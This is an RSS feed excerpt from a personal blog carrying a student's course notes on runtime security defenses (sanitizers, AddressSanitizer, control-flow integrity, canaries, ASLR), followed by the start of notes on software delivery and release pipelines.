        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Runtime sanity checking&lt;/li&gt;
&lt;li&gt;Defensive programming; anticipate what might go wrong in software
&lt;ul&gt;
&lt;li&gt;Normal paradigm: expect others to follow the rules&lt;/li&gt;
&lt;li&gt;Defensive paradigm: expect others to ignore / by-pass the rules&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;paranoia&#34; &gt;Paranoia
&lt;span&gt;
    &lt;a href=&#34;#paranoia&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;NULL-check for every pointer access even when its an internal function called by a public function that does the check&lt;/li&gt;
&lt;li&gt;Undefined behavior sanitizer (UBSan)
&lt;ul&gt;
&lt;li&gt;stateless sanity checks&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-fsanitize=bool&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;loading of a bool value which is neither true nor false&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-fsanitize=bounds&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;statically known checking&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-fsanitize=function&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;wrong type of pointer when calling&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-fsanitize=null&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-fsanitize=integer-divide-by-zero&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-fsanitize=integer-overflow&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dynamic-checking&#34; &gt;Dynamic Checking
&lt;span&gt;
    &lt;a href=&#34;#dynamic-checking&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Fat pointer&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;addresssanitizer-asan&#34; &gt;AddressSanitizer (ASan)
&lt;span&gt;
    &lt;a href=&#34;#addresssanitizer-asan&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Overhead of ASan is 70% on average&lt;/li&gt;
&lt;li&gt;Shadow memory&lt;/li&gt;
&lt;li&gt;Fast shadow translation&lt;/li&gt;
&lt;li&gt;Memory available gets mapped to shadow&lt;/li&gt;
&lt;li&gt;Shadow gets mapped to inaccessible&lt;/li&gt;
&lt;li&gt;Compact representation (7 bytes of membery into 1 byte of shadow memory)&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// before:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;*addr = ...; or ... = *addr;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// after:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (*&lt;span style=&#34;color:#447fcf&#34;&gt;MemToShadow&lt;/span&gt;(address) != &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;ReportError&lt;/span&gt;(address, ...);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;*address = ...; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// or: ... = *address;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;limitations:
&lt;ul&gt;
&lt;li&gt;continuous overrun detection only&lt;/li&gt;
&lt;li&gt;limited protection on use-after-free&lt;/li&gt;
&lt;li&gt;incompataible with other security scheme (e.g. UBSan)&lt;/li&gt;
&lt;li&gt;not suitable for library developers
&lt;ul&gt;
&lt;li&gt;not possible to use an application that is not using ASan with a library compiled with ASan&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;why-is-java-efficient&#34; &gt;Why is Java Efficient?
&lt;span&gt;
    &lt;a href=&#34;#why-is-java-efficient&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;no 70% overhead but you still get an array index out of bounds exception&lt;/li&gt;
&lt;li&gt;Java Virutal Machine means the JVM can store extra metadata like length without depending on OS memeory implementation&lt;/li&gt;
&lt;li&gt;Java does not allow &lt;strong&gt;arbitrary casting&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Only upward cast and sometimes downward cast. No re-interpret cast so length is always there. New object needs to be created for &amp;ldquo;re-interpreting&amp;rdquo;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;reference-monitor&#34; &gt;Reference Monitor
&lt;span&gt;
    &lt;a href=&#34;#reference-monitor&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h3 id=&#34;runtime-verification-rv&#34; &gt;Runtime Verification (RV)
&lt;span&gt;
    &lt;a href=&#34;#runtime-verification-rv&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Validation: are we building the right product?&lt;/li&gt;
&lt;li&gt;Verification: are we building the product right?&lt;/li&gt;
&lt;li&gt;linear temporal logic (LTL): primitive properties, propositional connectives, temporal connectives&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;control-flow-integrity-cfi&#34; &gt;Control-Flow Integrity (CFI)
&lt;span&gt;
    &lt;a href=&#34;#control-flow-integrity-cfi&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Shadow Stack: return address protection  inside Intel&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;aspect-oriented-programming&#34; &gt;Aspect Oriented Programming
&lt;span&gt;
    &lt;a href=&#34;#aspect-oriented-programming&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;separation of cross-cutting concerns&lt;/li&gt;
&lt;li&gt;logging&lt;/li&gt;
&lt;li&gt;obscures control flow&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;entropy&#34; &gt;Entropy
&lt;span&gt;
    &lt;a href=&#34;#entropy&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;program-analysis&#34; &gt;program analysis
&lt;span&gt;
    &lt;a href=&#34;#program-analysis&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- &lt;span style=&#34;color:#447fcf&#34;&gt;scanf&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, buf);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;+ &lt;span style=&#34;color:#447fcf&#34;&gt;scanf&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;%15s&amp;#34;&lt;/span&gt;, buf);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;exploit-mitigation&#34; &gt;Exploit mitigation
&lt;span&gt;
    &lt;a href=&#34;#exploit-mitigation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Add canary&lt;/p&gt;
&lt;h3 id=&#34;randomizing-memory-addresses&#34; &gt;Randomizing Memory Addresses
&lt;span&gt;
    &lt;a href=&#34;#randomizing-memory-addresses&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;ASLR — Address Space Layout Randomization
&lt;ul&gt;
&lt;li&gt;a system-level protection that randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PIE — Position Independent Executable
&lt;ul&gt;
&lt;li&gt;a body of machine code that executes properly regardless of its absolute address. This is also known as position-independent code (PIC)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;entropies-in-heap-allocators&#34; &gt;Entropies in Heap Allocators
&lt;span&gt;
    &lt;a href=&#34;#entropies-in-heap-allocators&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Allocate in random placements with canry boundaries&lt;/p&gt;
&lt;h3 id=&#34;software-diversity&#34; &gt;Software Diversity
&lt;span&gt;
    &lt;a href=&#34;#software-diversity&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;different compilers&lt;/li&gt;
&lt;li&gt;different languages&lt;/li&gt;
&lt;li&gt;different sanitization techniques&lt;/li&gt;
&lt;li&gt;different application (nginx vs apache)&lt;/li&gt;
&lt;li&gt;different libc implementation&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>CS 489 Software Delivery</title>
      <link>https://blog.elijahlopez.ca/posts/university/cs-489-software-delivery/</link>
      <pubDate>Mon, 08 Jan 2024 13:04:18 -0500</pubDate>
      
      <guid>https://blog.elijahlopez.ca/posts/university/cs-489-software-delivery/</guid>
      <description>&lt;h2 id=&#34;summary&#34; &gt;Summary
&lt;span&gt;
    &lt;a href=&#34;#summary&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;In the past, software delivery used to be walled. Each team would be just hand off their work output to the next team and not care about the end product.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Want to deliver software faster with less big changes&lt;/li&gt;
&lt;li&gt;Continuous Integration: Find issues in patches continuously (after commits), to reduce the costs due to the developer&amp;rsquo;s memory fading (context switching)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;design-and-implementation-of-release-pipelines&#34; &gt;Design and Implementation of Release Pipelines
&lt;span&gt;
    &lt;a href=&#34;#design-and-implementation-of-release-pipelines&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;Integrate&lt;/li&gt;
&lt;li&gt;Build&lt;/li&gt;
&lt;li&gt;Deploy&lt;/li&gt;
&lt;li&gt;Monitor&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;What are patches?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Bug fixes&lt;/li&gt;
&lt;li&gt;Refactoring: behaviour preserving software change&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We need to &lt;strong&gt;integrate&lt;/strong&gt; patches using VCS or something..&lt;/p&gt;
&lt;p&gt;We need to build the patch to ensure nothing broke.&lt;/p&gt;
&lt;p&gt;Then we need to deploy the build.&lt;/p&gt;
&lt;p&gt;Lastly, we need to monitor (continuous experimentation). Canary, A/B testing. Blue-Green, Chaos engineering. This leads to new patches since this specific deployment was targeted.&lt;/p&gt;
&lt;p&gt;Maintenance&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Corrective (bug fixes)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;modules&#34; &gt;Modules
&lt;span&gt;
    &lt;a href=&#34;#modules&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;Logistics and Foundations: what?, basics version control, build systems&lt;/li&gt;
&lt;li&gt;Release pipelines: Continuous Integration, Continuous Delivery (CI/CD), Waste &amp;amp; Acceleration&lt;/li&gt;
&lt;li&gt;Infrastructure &amp;amp; Deployment: Virtualization (flabours, hypervisors, timeline, containers), Infrastructure-as-code. Overview, A declarative solution&lt;/li&gt;
&lt;li&gt;Deployment Strategies: Mitigating Features (Blue-Green Deployment), Experimentation, Resiliency&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;architecture-of-open-source-applications-firefox&#34; &gt;Architecture of Open Source Applications (Firefox)
&lt;span&gt;
    &lt;a href=&#34;#architecture-of-open-source-applications-firefox&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h4 id=&#34;introduction&#34; &gt;Introduction
&lt;span&gt;
    &lt;a href=&#34;#introduction&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Firefox, more users, more issues will come up&lt;/li&gt;
&lt;li&gt;Proactive mindset&lt;/li&gt;
&lt;li&gt;Every release = energy release &amp;ldquo;chemical spill&amp;rdquo;&lt;/li&gt;
&lt;li&gt;Post-release evaluation (areas to improve)&lt;/li&gt;
&lt;li&gt;Automation to reduce human involvement and error&lt;/li&gt;
&lt;li&gt;Go to build process
&lt;ul&gt;
&lt;li&gt;Standardized process to every single release and one person to track this (release coordinator)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Prioritize fixing small issues before&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;release-coordinator&#34; &gt;Release coordinator
&lt;span&gt;
    &lt;a href=&#34;#release-coordinator&#34;&gt;
